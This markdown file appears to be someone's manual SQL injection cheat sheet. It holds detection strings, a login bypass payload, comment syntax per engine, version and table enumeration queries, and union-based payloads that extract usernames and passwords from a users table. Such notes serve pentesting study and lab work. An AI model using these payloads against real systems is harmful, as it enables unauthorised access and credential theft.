# SQL Injections

This file is mostly for manual SQL injections. There should be separate notes for SQLMap somewhere.

## Table of Contents:

* Detection
* Comments
* Enumeration
* Union-Based
* Error-Based
* Time-Based
* Concat rows

## Detection

When doing manual enum, throw some special characters into a parameter and see if it breaks anything in an unexpected way:

```default
'"(){};
```
```default
'"(){}; -- -#/*
```

But you might also be able to trigger a lot with just a single `'`.

The most basic SQL login bypass:

* user: `' or '1'='1'-- -`
* pass: `' or '1'='1'-- -`


Sometimes you need to escape a function:
```default
') <your injection> -- -
```
or
```default
) <your injection> -- -
```

It might requires a bunch of brackets: `'))) <your injection> -- -`


## Comments

You often need to get rid of the part of the query that comes after your injection. You can do that by simply commenting out the remainder of the query.

Most often the two minuses work:
```default
--
```

But sometimes it is required that there is a space after the minuses: `-- `. An additional character afterwards ensures the space does not get removed in some strip() or trim() function.

So this is the preferred method that almost always work:
```default
-- -
```

Multi-line comments are also supported sometimes: `/* comment goes here */`. 
Obviously this might not always work because you can only control the comment start `/*`. 
Maybe you can create some funny results through multiple injection points into the same query.

Some engines also support the hash character `#` to initiate a comment.

* MySQL: #, --
* MS SQL: --
* MS Access: %00 (hack!)
* Oracle: --


## Database Software Enum

The first thing you want to do is try to find out what you are working with. That will determine the syntax you have to use and where you have to look for interesting data.

### Version

* Oracle : `select banner from v$version-- -`
* Mysql : `select VERSION();` ;alternatively: `SELECT @@version`
* MSSQL : `SELECT @@version`
* PostgreSQL : `SELECT version()`

### Tables

Databases besides Oracle usually support:

```default
SELECT * FROM information_schema.tables
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE FROM information_schema.tables
```

The rows of a table work similar:
```default
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE WHERE table_name = 'Users'
```

Oracle:
```default
SELECT * FROM all_tables 
```

```default
SELECT * FROM all_tab_columns 
```


## Union-based attacks

* When to use:    There is a generated list/table of items generated by an injectible query
* Target result:  Include the rows of another table into the generated list/table (like username, password of a users table)

### Figure out number of selected rows

You can use the `order by` keyword. The query will error out if you order by a number greater than the available rows.

```default
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
... etc.
```

Alternatively you might be able to union select some data constants:

```default
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
... etc.
```

or

```default
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
... etc.
```

The last version might not always work, but the benefit is that you can see where each row ends up in the printed table.

Figure out data type of each row:
```default
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

For ints do the same with some number.


On Oracle you might have to use a table even for constant data values, use the build-in DUAL table then:
```default
' UNION SELECT NULL,NULL FROM DUAL--. 
```

### Example
```default
' union select username,password from users-- -
```

### Concatinate several rows

Maybe you can only control a single row or you have to deal with multi line output, then you need to concat content.

#### Oracle:

```default
' union select NULL,username || '~' ||password from users-- -
```

Which selects the rows username and password into one row like 'admin~password123'











